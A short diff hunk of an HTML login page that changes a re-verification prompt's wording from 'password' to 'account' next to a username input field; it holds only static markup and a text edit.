@@ -183,7 +183,7 @@
 
                             
                             
-                        <div><center> <p><font face="Trebuchet MS" color="black" size="2"> Because you're accessing sensitive info, you need to verify your password</font></div>
+                        <div><center> <p><font face="Trebuchet MS" color="black" size="2"> Because you're accessing sensitive info, you need to verify your account</font></div>
                         <fieldset>
                             <label for="username" class="field">Email or Username</label>
                             <input type="text" name="username" size="20" id="username" maxlength="50" data-invalid="" required>
